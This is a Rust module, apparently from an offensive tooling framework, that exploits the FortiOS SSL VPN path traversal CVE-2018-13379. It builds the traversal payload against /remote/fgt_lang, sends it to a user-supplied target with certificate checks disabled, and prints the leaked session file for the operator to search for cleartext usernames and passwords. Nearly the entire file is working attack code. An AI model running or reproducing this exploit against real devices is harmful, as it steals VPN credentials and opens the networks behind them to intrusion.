use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target};

/// FortiOS SSL VPN Path Traversal (CVE-2018-13379)
/// 
/// Exploits a path traversal in the FortiOS SSL VPN web portal to leak the 
/// session file which contains cleartext credentials.
/// 
/// Target: /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Determine target URL
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP").await?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    // Typically runs on port 10443 or 443 depending on config, but standard PoCs often try https logic
    // We will assume standard https port or user provided port in target
    // If target has no port, normalize_target adds none (if raw was just IP).
    // Let's ensure schema.
    
    let base_url = if target_ip.contains("://") {
        target_ip.clone()
    } else {
        format!("https://{}", target_ip) // Default to HTTPS
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);
    
    // Construct payload
    // The vulnerability is in the `lang` parameter.
    // We need to bypass some sanitization hence the multiple slashes in some variants, 
    // but the standard known working payload is usually:
    // /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
    
    let payload_path = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession";
    let full_url = format!("{}{}", base_url.trim_end_matches('/'), payload_path);
    
    println!("{} Sending malicious request...", "[*]".blue());
    println!("{} URL: {}", "[*]".blue(), full_url);

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()?;
        
    let res = client.get(&full_url)
        .send()
        .await
        .context("Failed to send request")?;
        
    let status = res.status();
    
    if status.is_success() {
        // If successful, the body should contain the binary content of the session file.
        // It often contains ASCII strings combined with binary data.
        let bytes = res.bytes().await?;
        
        println!("{} Request successful (HTTP 200)!", "[+]".green());
        println!("{} Checking for session data...", "[*]".blue());
        
        // Simple heuristic: check if it looks like a valid response (not just a login page ignoring the param)
        // The file usually starts with some binary structure but contains "var fgt_lang =" if getting the JS?
        // No, if vulnerable, we get the actual file `sslvpn_websession`.
        // A common false positive is returning the login page.
        // Login pages usually contain "<html>" or "<!DOCTYPE html>".
        // The binary file shouldn't.
        
        // We will print the hex dump or strings found.
        let body_str = String::from_utf8_lossy(&bytes);
        
        if body_str.contains("<html>") || body_str.contains("<!DOCTYPE") {
             println!("{} Response looks like a standard HTML page. Exploit likely failed.", "[-]".yellow());
             return Ok(());
        }
        
        println!("{} Possible Credential Dump:", "[+]".green().bold());
        
        // Print printable characters to help identify user/pass
        let printable: String = body_str.chars()
            .filter(|c| c.is_ascii_graphic() || c.is_ascii_whitespace())
            .collect();
            
        println!("{}", "---------------------------------------------------".cyan());
        println!("{}", printable);
        println!("{}", "---------------------------------------------------".cyan());
        println!("{} Look for username/password patterns in the output above.", "[*]".yellow());
        
    } else {
        println!("{} Request failed with status: {}", "[-]".red(), status);
    }
    
    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║      FortiOS SSL VPN Path Traversal (CVE-2018-13379)      ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
